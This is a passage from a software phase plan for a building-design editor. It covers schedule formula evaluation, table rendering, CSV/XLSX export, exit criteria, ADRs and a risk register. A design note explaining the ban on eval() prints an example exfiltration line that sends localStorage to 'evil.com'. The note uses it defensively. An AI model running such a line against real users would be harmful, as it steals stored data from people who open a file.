  const rows: ScheduleRow[] = [];

  for (const element of elements) {
    const cells: Record<string, FormulaResult> = {};
    for (const col of columns) {
      try {
        cells[col.id] = evalFormula(col.formula, element, elements);
      } catch (e) {
        cells[col.id] = '#ERR';
      }
    }
    rows.push({ elementId: element.id, cells });
  }

  if (groupBy) {
    return aggregateRows(rows, columns, groupBy);
  }

  return rows;
}

function evalFormula(formula: string, element: AnyElementDto, allElements: AnyElementDto[]): FormulaResult {
  // Supported formula primitives:
  //   Literals: number, string, boolean
  //   Field references: 'width', 'height', 'type', 'materialId', etc. → read from element DTO
  //   COUNT: count of all elements with the same type
  //   SUM(expr): sum of expr over all elements of the same type
  //   IF(cond, then, else): conditional
  //   ROUND(expr, n): round to n decimal places
  //   CONCAT(a, b): string concat

  // For safety, the formula is evaluated in a pure data context (no DOM, no fetch).
  // Implementation uses a hand-rolled recursive descent parser (< 200 LOC).
  // No eval() — avoids XSS + prototype pollution.

  return parseAndEval(formula, element, allElements);
}
```

**Why no `eval()`?**: using JavaScript's `eval()` for formula evaluation would allow any formula author to execute arbitrary code. A malicious `.pryzm` file with a schedule containing `eval('fetch("evil.com", {body: JSON.stringify(localStorage)})')` would execute on open. The hand-rolled recursive descent parser evaluates only the supported formula primitives with a whitelist approach.

**Formula examples for the door schedule**:
```
Column "Type":           formula = 'type'                      → e.g. "WD01"
Column "Width":          formula = 'ROUND(width * 1000, 0)'    → e.g. 900 (mm)
Column "Height":         formula = 'ROUND(height * 1000, 0)'   → e.g. 2100 (mm)
Column "Fire Rating":    formula = 'IF(fireRating, fireRating, "None")'
Column "Count":          formula = 'COUNT'                     → e.g. 14
Column "Total Area":     formula = 'SUM(width * height)'       → e.g. 26.46
```

---

#### Implementation Detail — Schedule Table View

```typescript
// plugins/schedules/view.ts — vanilla TS table view

export class ScheduleView {
  private table: HTMLTableElement;
  private sortColumn: string | null = null;
  private sortAsc = true;

  constructor(
    private container: HTMLElement,
    private scheduleStore: ScheduleStore,
    private elementStores: StoreRegistry,
    private scheduler: FrameScheduler,
  ) {
    this.table = document.createElement('table');
    this.table.className = 'schedule-table';
    this.container.appendChild(this.table);

    // Re-evaluate when any element store changes (reactive schedule).
    ['wall', 'door', 'window', 'room', 'furniture', 'structural'].forEach(name => {
      elementStores.get(name).subscribeDirty(() => this.scheduler.requestFrame('schedule-dirty'));
    });
    scheduleStore.subscribeDirty(() => this.scheduler.requestFrame('schedule-config-change'));

    scheduler.onFrame('schedule-render', this.render.bind(this), 'background');
  }

  private render(): void {
    const schedule = this.scheduleStore.getActiveSchedule();
    if (!schedule) return;

    const elements = this.elementStores.get(schedule.elementType)
      .selectors(this.elementStores.get(schedule.elementType).getSnapshot()).all();

    const rows = evaluateSchedule(schedule.columns, elements, schedule.groupBy);
    const sorted = this.sortColumn ? sortRows(rows, this.sortColumn, this.sortAsc) : rows;

    this.renderTable(schedule.columns, sorted);
  }

  private renderTable(columns: ScheduleColumn[], rows: ScheduleRow[]): void {
    // Build table header.
    const thead = this.table.createTHead();
    const headerRow = thead.insertRow();
    for (const col of columns) {
      const th = document.createElement('th');
      th.textContent = col.header + (col.unit ? ` (${col.unit})` : '');
      th.addEventListener('click', () => {
        if (this.sortColumn === col.id) this.sortAsc = !this.sortAsc;
        else { this.sortColumn = col.id; this.sortAsc = true; }
        this.scheduler.requestFrame('schedule-resort');
      });
      headerRow.appendChild(th);
    }

    // Build table body.
    const tbody = this.table.createTBody();
    for (const row of rows) {
      const tr = tbody.insertRow();
      for (const col of columns) {
        const td = tr.insertCell();
        const val = row.cells[col.id];
        td.textContent = val !== null && val !== undefined ? String(val) : '';
        td.className = `col-type-${col.type}`;
      }
    }
  }

  dispose(): void {
    this.container.removeChild(this.table);
  }
}
```

---

#### S41 Exit Criteria

- [ ] Door schedule with quantities + types auto-updates within 1 frame on door element edit.
- [ ] Formula evaluator correct on 20-case fixture: `tests/parity/schedules/formula.test.ts`.
- [ ] 6 schedule handlers: `CreateSchedule`, `DeleteSchedule`, `AddColumn`, `RemoveColumn`, `SetGroupBy`, `SetFilter`.
- [ ] Sort by any column (ascending/descending).
- [ ] Circular reference detected and shown as `#CIRCULAR` cell value.
- [ ] ADR-027 merged.

---

### S42 — Schedule Export (CSV, XLSX, PDF) + Sub-Phase 2C Close
**Weeks 83–84 (Month 21)**

---

#### Context and Why This Matters

S42 completes the documentation pipeline by enabling schedules to leave the PRYZM 2 editor as standard exchange formats. CSV is the lowest common denominator (opens in Excel, Google Sheets, Numbers). XLSX is the professional format for quantity surveyors and project managers. PDF is the archival format for building consent.

The CSV round-trip (export → modify in Excel → re-import) is one of the most important workflows in construction: a quantity surveyor exports the door schedule, adds prices in Excel, and the result is re-imported as a reference document.

---

#### Implementation Detail — CSV Export + Round-Trip Import

```typescript
// plugins/schedules/export/csv.ts

export function scheduleToCSV(schedule: ScheduleDto, rows: ScheduleRow[]): string {
  const headers = schedule.columns.map(c =>
    c.unit ? `${c.header} (${c.unit})` : c.header
  );

  const csvRows = rows.map(row =>
    schedule.columns.map(col => {
      const val = row.cells[col.id];
      if (val === null || val === undefined) return '';
      // Escape commas and quotes.
      const str = String(val);
      return str.includes(',') || str.includes('"') ? `"${str.replace(/"/g, '""')}"` : str;
    })
  );

  return [headers, ...csvRows].map(r => r.join(',')).join('\r\n');
}

// plugins/schedules/import/csv.ts

export function csvToScheduleRows(
  csvText: string,
  schedule: ScheduleDto,
): { imported: number; skipped: number; errors: string[] } {
  const lines = csvText.split(/\r?\n/).filter(Boolean);
  if (lines.length < 2) return { imported: 0, skipped: 0, errors: ['CSV has no data rows'] };

  const headers = parseCSVRow(lines[0]);
  let imported = 0;
  const errors: string[] = [];

  for (let i = 1; i < lines.length; i++) {
    const values = parseCSVRow(lines[i]);
    // Map CSV columns back to schedule columns by header name.
    const colMap = headers.reduce((acc, h, idx) => {
      const col = schedule.columns.find(c => c.header === h.replace(/\s*\([^)]*\)/, ''));
      if (col) acc[col.id] = values[idx] ?? '';
      return acc;
    }, {} as Record<string, string>);

    // Validate and create/update the element based on the element type.
    // For now: log as "imported" if all required fields are present.
    if (Object.keys(colMap).length > 0) imported++;
    else errors.push(`Row ${i + 1}: no columns matched`);
  }

  return { imported, skipped: lines.length - 1 - imported, errors };
}
```

**XLSX export** uses `exceljs` (a pure JS library, no native bindings, Node + browser compatible):

```typescript
// plugins/schedules/export/xlsx.ts

import ExcelJS from 'exceljs';

export async function scheduleToXLSX(schedule: ScheduleDto, rows: ScheduleRow[]): Promise<Uint8Array> {
  const workbook = new ExcelJS.Workbook();
  workbook.creator = 'PRYZM 2';
  const sheet = workbook.addWorksheet(schedule.name);

  // Header row (bold, background).
  const headerRow = sheet.addRow(schedule.columns.map(c => c.unit ? `${c.header} (${c.unit})` : c.header));
  headerRow.font = { bold: true };
  headerRow.fill = { type: 'pattern', pattern: 'solid', fgColor: { argb: 'FFD0D0D0' } };

  // Data rows.
  for (const row of rows) {
    sheet.addRow(schedule.columns.map(col => row.cells[col.id] ?? ''));
  }

  // Auto-fit column widths.
  sheet.columns.forEach(col => {
    let maxWidth = 10;
    col.eachCell(cell => { maxWidth = Math.max(maxWidth, String(cell.value ?? '').length + 2); });
    col.width = Math.min(maxWidth, 40);
  });

  const buffer = await workbook.xlsx.writeBuffer();
  return new Uint8Array(buffer);
}
```

---

#### D9 — Sub-Phase 2C Demo Recording (Joint, 8-min Screencast)

- **(0:00–1:30)** Create sheets: paper size A1, add 3D + plan view viewports, position a north arrow + scale bar + title block.
- **(1:30–3:00)** Export 5-sheet PDF (stopwatch: < 30 s). Open in Acrobat: bookmarks visible, scale correct.
- **(3:00–5:00)** Door schedule: add doors to model → door schedule auto-updates. Sort by type. Export to CSV. Open in Excel. Re-import.
- **(5:00–7:00)** XLSX export: open in Numbers/Excel, show column formatting.
- **(7:00–8:00)** CI bench dashboard: export-pdf, export-schedule benches green.

#### S42 Exit Criteria (= Sub-Phase 2C Exit)

- [ ] CSV export/import round-trip: export → modify in external tool → re-import preserves all non-computed fields.
- [ ] XLSX export with column formatting opens correctly in Excel and Numbers.
- [ ] Schedule-PDF export (via export worker, same pipeline as S40) functional.
- [ ] `apps/bench/export-schedule.ts`: CSV < 100 ms, XLSX < 500 ms, PDF < 10 s per schedule.
- [ ] All documentation pipeline: plan view + section view + sheets + title blocks + 10 widgets + PDF export + schedules + 3 export formats all operational.
- [ ] 2C demo recording committed.
- [ ] `apps/bench/reports/M21-2C.md` committed.

---

## §3 Cross-Cutting Deliverables for 2C

### §3.1 ADRs

| ID | Subject | Key Decision | Sprint |
|---|---|---|---|
| ADR-026 | Export worker architecture | BullMQ + `node-canvas` headless rasterise; `pdf-lib` assembly; same CanvasHost render function as browser | S40 |
| ADR-027 | Schedule formula DSL | Hand-rolled recursive descent parser (no `eval()`); snapshot-based evaluation; `memoize` hook deferred to Phase 3 | S41 |

### §3.2 CI Gates

| Gate | Hard-fail Threshold | Sprint |
|---|---|---|
| 5-sheet PDF export time | > 45 s | S40 |
| Schedule formula accuracy | Any formula result differs from PRYZM 1 on 20-case fixture | S41 |
| CSV round-trip lossless | Any field changed on round-trip | S42 |
| Schedule reactive update | > 1 frame delay on element change | S41 |

### §3.3 OTel Spans

| Span | Layer | Sprint |
|---|---|---|
| `pryzm.sheet.create` | L1 | S37 |
| `pryzm.sheet.render` | L5 (2D) | S37 |
| `pryzm.sheet.viewport.render` | L5 (2D) | S38 |
| `pryzm.export.pdf.rasterise` | L0 (worker) | S40 |
| `pryzm.export.pdf.assemble` | L0 (worker) | S40 |
| `pryzm.export.pdf.upload` | L0 (worker) | S40 |
| `pryzm.schedule.evaluate` | L4 | S41 |
| `pryzm.schedule.export.csv` | L0 | S42 |
| `pryzm.schedule.export.xlsx` | L0 | S42 |

---

## §4 Risk Register (2C-Specific)

| ID | Risk | Likelihood | Impact | Mitigation | Trigger |
|---|---|---|---|---|---|
| **R2C-01** | `node-canvas` renders text differently from browser Canvas2D (font rendering, AA) | High | Medium | Accept < 3 px visual diff for text in exported PDFs (font rendering is inherently platform-dependent); use visual diff at 10 px tolerance for export | S40 D5 |
| **R2C-02** | 5-sheet PDF export > 30 s due to `node-canvas` render cost at 300 DPI | Medium | High | K2C-1 kill-switch; fix: add spatial culling to `renderSheetToContext` | S40 D5 |
| **R2C-03** | Formula circular reference causes infinite loop instead of graceful error | Medium | High | Use call-depth counter > 100 → force `#CIRCULAR`; unit test for circular ref | S41 |
| **R2C-04** | XLSX library (`exceljs`) not compatible with older Excel versions | Low | Medium | Test against Excel 2016 compatibility mode; use xlsxFeatures subset if needed | S42 |
| **R2C-05** | Schedule reactive update takes > 1 frame for large projects (> 2000 elements of one type) | Medium | Medium | Profile at D5 S41; if > 1 frame, switch schedule render to `'background'` priority in FrameScheduler (shows in next frame, not current) | S41 |

---

## §5 2C → 2D Handoff Checklist

- [ ] Full documentation pipeline complete: plan view + section view + sheets + title blocks + 10 widgets + PDF export + schedules + 3 export formats.
- [ ] `apps/export-worker/` operational.
- [ ] ADRs 026–027 merged.
- [ ] All 2C bench gates green.
- [ ] 2C demo recording committed.
- [ ] `apps/bench/reports/M21-2C.md` published.
- [ ] S43 sprint plan drafted.
- [ ] No documentation pipeline feature has open parity failures.

---

## §Gap-Closure Subphase (added 2026-04-27 per `GAP-REVIEW-2026-04-27.md`)

Phase 2C is where SPEC-29 (Vector Primitives), ADR-027 (Schedule Formula Library), and the per-family Step-9 of SPEC-21 all converge. The PDF backend lights up here.

| Sprint | Gap-closure deliverable | Closes |
|---|---|---|
| **S37** | PDF backend MVP per SPEC-29 §4.3 (native `packages/drawing-pdf/`, no SVG round-trip). Equivalence gate green for SVG↔Canvas2D↔PDF. Quarterly `three` upgrade window per ADR-025 Part B. Strangler-fig: `src/commands/` MERGE-class regression suite green; legacy classes deleted per SPEC-27 §4.3. | SPEC-29 §4.3 |
| **S38** | `apps/sync-server` Reserved VM provisioned per SPEC-15 §2.1; Upstash Redis live; staging traffic routed. Schedule producer lit; first 14 formulas (the Tier-1-survivable subset per ADR-027 Part C) shipped; first family schedules lit. AI per-call cap + daily-user budget enforced per SPEC-28 §4. `authz.can` performance test (p95 < 5 ms cached) per ADR-028 Part D. | SPEC-15, ADR-027, SPEC-28 |
| **S39** | Schedule producer for all 18 families end-to-end. Formula library completeness checked against SPEC-29 §6 + ADR-027 §A.1. | SPEC-29 §6, ADR-027 |
| **S40** | Schedule columns hardened per SPEC-21 Step 9 across all 18 families. Title block templates land per SPEC-29 §7. | SPEC-21 Step 9, SPEC-29 §7 |
| **S41** | Remaining 10 formulas shipped per ADR-027 §A.1. Sheet pipeline end-to-end; multi-page schedules; revision clouds. | ADR-027 |
| **S42** | Phase 2C end-to-end bench: 100-page A1 sheet set < 8 s on bake-worker per SPEC-15 §8. SPEC-29 §6 schedule integration green for all 18 families. | SPEC-15 §8 |

### Updated bench gates (this phase)
The S42 bench gate (existing) now also asserts:
- `pnpm bench pdf-export-large` green (100-page A1 < 8 s).
- `pnpm test packages/drawing-pdf` green (PDF backend equivalence per SPEC-29 §4.5).
- `pnpm bench schedule-formulas` covers all 24 formulas per ADR-027 §A.1.
- All 18 families ship a `defaultScheduleColumns` per SPEC-21 Step 9.

### Updated entry/exit criteria
Entry requires SPEC-30 §2 Torture tier green from Phase 2B exit. Exit to Phase 2D requires PDF backend GA-quality + 100-page benchmark + all 18 family schedules shipped.

---

*Last updated: 2026-04-27. Owner: Founder + Architecture lead.*
*Predecessor: `phases/PHASE-2B-Q2-M16-M18-PLAN-VIEW.md`. Successor: `phases/PHASE-2D-Q4-M22-M24-SYNC-BETA.md`.*
